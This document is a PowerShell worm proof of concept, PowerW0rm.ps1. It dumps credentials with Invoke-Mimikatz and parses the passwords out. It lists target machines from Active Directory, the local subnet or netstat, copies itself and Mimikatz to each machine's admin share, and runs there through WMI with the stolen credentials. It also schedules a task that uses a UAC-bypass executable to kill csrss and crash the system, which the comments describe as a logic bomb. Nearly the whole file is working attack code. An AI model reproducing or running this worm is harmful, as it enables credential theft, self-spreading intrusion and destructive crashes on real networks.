<####
# PowerW0rm.ps1, a worm PoC
# see http://khr0x40sh.wordpress.com for details
####>
<####################### Credential Harvesting ###########################>
#try to grab creds
$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptPath = $scriptPath + "\Invoke-Mimikatz.ps1 -dumpcreds"
$creds = powershell -exec Bypass $scriptPath
$creds_str = [string]$creds

Write-Host "##############################################################"
$creds_regex= @"
.*\*\sUsername.*
.*\*\sDomain.*
.*\*\sPassword.*
"@

$creds_str = $creds -replace " ", "`r`n"

$cred_store = @{}

$found = new-object System.Text.RegularExpressions.Regex($creds_regex, [System.Text.RegularExpressions.Regexoptions]::Multiline)
$m=$found.Matches($creds_str)

function parsed()
{
Param([string]$str1)
$p1 = $str1 -split '[\r\n]'
$parse=@()

for ($j=0; $j -lt 3; $j++)
{
$num = $j*2
$p2 = $p1[$num].split(":")
#Write-Host $j "," $num "," $p2
$p3 = $p2[1]

$parse+= , $p3
}
return $parse 
}

$hostN = [System.Net.Dns]::GetHostName()
Write-Host $hostN
$version = "1"
$multiT = 0

#get OS_VERSION, if 6 then use %USERPROFILE%\Downloads, else %USERPROFILE%\My Documents... left in to be easily changed
$prof = "USERPROFILE"
$profile = (get-item env:$prof).Value +"\Downloads"
#$profile = "C:\Users\Public\Downloads"

$enum = Get-WMIObject win32_NetworkAdapterConfiguration | 
  Where-Object { $_.IPEnabled -eq $true } | 
  Foreach-Object { $_.IPAddress } | 
  Foreach-Object { [IPAddress]$_ } | 
  Where-Object { $_.AddressFamily -eq 'Internetwork'  } | 
  Foreach-Object { $_.IPAddressToString } 

#Write-Host $enum #debug

function getDomain {
$final = @()
#get Domain computers
$strCategory = "computer"
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
$objSearcher.SearchRoot = $objDomain
$objSearcher.Filter = ("(objectCategory=$strCategory)")
$colProplist = "name", "cn"
foreach ($i in $colPropList){$objSearcher.PropertiesToLoad.Add($i)}
$colResults = $objSearcher.FindAll()
foreach ($objResult in $colResults) 
{
     $objComputer = $objResult.Properties
         $bleh = $objComputer.name
         $final += $bleh
}
     return $final
}

function getClassC{
Param($ip);
$final = @()
$classC = $ip.Split(".")[0]+"."+$ip.Split(".")[1]+"."+$ip.Split(".")[2]
for($i=1; $i -lt 255; $i++)
{
      $final += $classC + $i.ToString()
}
   return $final
}

function getNetStatHosts{
Param($ip);
$final = @()
#//netstat mode
$n = netstat -ano
foreach ($n2 in $n)
{
    $n4= $n2.Split(" ")
    foreach ($n3 in $n4)
    {
        $n5 = $n3.Split(":")[0]
        if (($n5.Length -gt 7) -and ($n5.Length -lt 22))
        {
             if (!( ($n5 -eq "0.0.0.0") -or ($n5 -eq $ip) -or ($n5 -eq "127.0.0.1") ) )
             {
                  if ($n5.Contains("."))
                 {
                    Write-Host $n5
                    $final += $n5
                  }
             }
         }
     }
}
}

<####################### Enumeration ###########################>
$nethosts=@()
try
{
	$nethosts= getDomain
}
catch
{
	try
	{
		$nethosts= getClassC $enum
	}
	catch
	{
		$nethosts = getNetStatHosts $enum
	}
}
$nethosts = $nethosts | select -uniq


foreach ($nethost in $nethosts)
{
write-host "Exec on  " + $nethost
if ($nethost.Length -gt 0)
{
	$i=1
<####################### Creds Parse, round 2 ###########################>
	if ($m)
	{

		$c_arr= @()
		$c_arr = parsed($m[$i].Value)
		$pdub = [string]$c_arr[2].trim()

		$password = ConvertTo-SecureString -string $pdub -AsPlainText -force
		$user1 = $c_arr[1].trim()+"\"+$c_arr[0].trim()

		$cred = New-Object -TypeName System.Management.Automation.PSCredential -argumentlist $user1,$password
	}
	#Write-host $user1	#debug

<####################### Spread ###########################>
	$pro1 = $profile.Substring(3,$profile.Length-3)
	$psdrive = "\\"+$nethost+"\C$\"+ $pro1

	#### New-PsDrive : create a new PsDrive only visible in powershell environement :
    New-PSDrive -Name Y -PSProvider filesystem -Root $psdrive 
    
    #### Copy  to remote side ####
    Copy-Item $profile\PowerW0rm.ps1 Y:\PowerW0rm.ps1
    Copy-Item $profile\Invoke-Mimikatz.ps1 Y:\Invoke-Mimikatz.ps1
    Remove-PsDrive -Name Y:

<####################### Exec ###########################>
	<###Templates##### 
    # Current User : Invoke-WMIMethod -Class Win32_Process -Name Create -Computername $nethost -ArgumentList $cmd
    # Dumped User  : Invoke-WMIMethod -Class Win32_Process -Name Create -Authentication PacketPrivacy -Computername $nethost -Credential $cred -Impersonation Impersonate -ArgumentList $str
    # Schtasks	   : Schtasks /CREATE /S $nethost /SC Daily /MO 1 /ST 00:01 /TN "update54" /TR $task /F
    #                Schtasks /RUN /TN "update54"
    #                Schtasks /DEL /TN "update54"
    #################>
    
    $run = "powershell -exec Bypass "+$profile+"\\PowerWorm.ps1"
	$task = $profile+"\\bypassuac-x64.exe /C powershell.exe -exec Stop-Process csrss" # BSOD for a logic bomb
	
	#run with dump creds
	Invoke-WMIMethod -Class Win32_Process -Name Create -Authentication PacketPrivacy -Computername $nethost -Credential $cred -Impersonation Impersonate -ArgumentList $run
	
	#run as current user
	Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList $run
	
	#schtask example
	schtasks /CREATE /S $nethosts /SC Daily /MO 1 /ST 00:01 /TN "update54" /TR $task /F     #scheduled for the 1st of the year @ 00:01 AM
	schtasks /RUN /TN "update54"                                                            #Runs task immediately (kills worm, but just PoC)
	schtasks /DEL /TN "update54"                                                            #would never run in this context, but is an example
	#### PROFIT #####>
  } 
}

#>

